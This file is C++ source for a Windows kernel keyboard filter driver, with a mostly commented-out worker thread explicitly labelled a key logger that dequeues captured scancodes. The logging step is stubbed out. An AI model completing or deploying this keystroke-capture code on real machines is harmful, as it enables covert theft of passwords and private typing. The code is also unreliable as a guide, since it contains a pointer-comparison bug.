extern "C"   
{   
    #include "ntddk.h"   
}   
   
#include "ntddkbd.h"   
#include "KbdFnFlt.h"   
#include "KbdFuncs.h"   
#include "KbdHook.h"   
//#include "ScanCode.h"   
extern int counter;
int zehler;
//@@@@@@@@@@@@@@@@@@@@@@@@   
// IRQL = passive level   
//@@@@@@@@@@@@@@@@@@@@@@@@@   
/*NTSTATUS InitThreadKeyLogger(IN PDRIVER_OBJECT pDriverObject)   
{   
   
    PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pDriverObject->DeviceObject->DeviceExtension;    
       
    //Set the worker thread to running state in device extension   
    pKeyboardDeviceExtension->bThreadTerminate = false;   
   
    //Create the worker thread   
    HANDLE hThread;    
    NTSTATUS status = PsCreateSystemThread(&hThread,(ACCESS_MASK)0,NULL,(HANDLE)0,NULL,ThreadKeyLogger,   
                        pKeyboardDeviceExtension);   

    
    if(!NT_SUCCESS(status))   
        return status;   
   
    DbgPrint("Key logger thread created...\n");   
       
    //Obtain a pointer to the thread object   
    ObReferenceObjectByHandle(hThread,THREAD_ALL_ACCESS,NULL,KernelMode,    
        (PVOID*)&pKeyboardDeviceExtension->pThreadObj, NULL);

	DbgPrint("Key logger thread initialized; pThreadObject =  %x\n",   
        &pKeyboardDeviceExtension->pThreadObj);   
    DbgPrint("Key logger thread initialized; pThreadObject2 =  %x\n",   
        &pKeyboardDeviceExtension->pThreadObj2);   
    //We don't need the thread handle   
    ZwClose(hThread);
	
       
    return status;   
}   */


   
//@@@@@@@@@@@@@@@@@@@@@@@@   
// IRQL = passive level   
//@@@@@@@@@@@@@@@@@@@@@@@@@   
/*VOID ThreadKeyLogger(IN PVOID pContext)   
{   
   
    PDEVICE_EXTENSION pKeyboardDeviceExtension = (PDEVICE_EXTENSION)pContext;   
    //PDEVICE_OBJECT pKeyboardDeviceOjbect = pKeyboardDeviceExtension->pKeyboardDevice;   
	//IO_STATUS_BLOCK io_status;
	//NTSTATUS thestatus;
	BOOLEAN condition = TRUE;
    PLIST_ENTRY pListEntry;   
	//char buf[2] = {0};
	LARGE_INTEGER byteOffset;
	byteOffset.QuadPart = 0;
	zehler = 0;
	
    KEY_DATA* kData; //custom data structure used to hold scancodes in the linked list
	/*do{
		thestatus = ZwReadFile(pKeyboardDeviceExtension->hLogFile,NULL,NULL,NULL,&io_status,&buf,1,&byteOffset,NULL);
		if(thestatus == STATUS_SUCCESS){
			byteOffset.QuadPart++;
		}else{
			buf[0] = '\0';
		}
	}while(buf[0]!=0);
	//DbgPrint("byteoffset %i", byteOffset.QuadPart);

    //Enter the main processing loop... This is where we will process the scancodes sent   
    //to us by the completion routine.   
    while(condition)   
    {   
        // Wait for data to become available in the queue    
        KeWaitForSingleObject(&pKeyboardDeviceExtension->semQueue,Executive,KernelMode,FALSE,NULL);     
		//for(zehler = 0; zehler < 3; zehler++){
			pListEntry = ExInterlockedRemoveHeadList(&pKeyboardDeviceExtension->QueueListHead,   
                                                &pKeyboardDeviceExtension->lockQueue);   
           
        //////////////////////////////////////////////////////////////////////   
        // NOTE: Kernel system threads must terminate themselves. They cannot   
        // be terminated from outside the thread. If the driver is being    
        // unloaded, therefore the thread must terminate itself. To do this   
        // we use a global variable stored in the Device Extension.    
        // When the unload routine wishes to termiate, it will set this    
        // flag equal to true and then block on the thread object. When   
        // the thread checks this variable and terminates itself, the   
        // Unload routine will be unblocked and able to continue its    
        // operations.   
        //////////////////////////////////////////////////////////////////////   
			if(pKeyboardDeviceExtension->bThreadTerminate == true)   
			{   
				PsTerminateSystemThread(STATUS_SUCCESS);   
			}   
           
        ///////////////////////////////////////////////////////////////////////   
        // NOTE: the structure contained in the list cannot be accessed directly.    
        // CONTAINING_RECORD returns a pointer to the beginning of the data structure   
        // that was inserted into the list.   
        ////////////////////////////////////////////////////////////////////////   
			kData = CONTAINING_RECORD(pListEntry,KEY_DATA,ListEntry);   
   
        //Convert the scan code to a key code   
			char keys[3] = {0};   
		
        //ConvertScanCodeToKeyCode(pKeyboardDeviceExtension,kData,keys);   
   
        //make sure the key has retuned a valid code before writing it to the file   
			if(keys != 0){   
            //write the data out to a file    
				//DbgPrint("Scancode: %i", kData->KeyData);
			
			}//end if
		//}
		if(pKeyboardDeviceExtension->bThreadTerminate == true)   
		{   
			PsTerminateSystemThread(STATUS_SUCCESS);   
		}   
    }//end while   
    return;   
}//end ThreadLogKeyboard  */

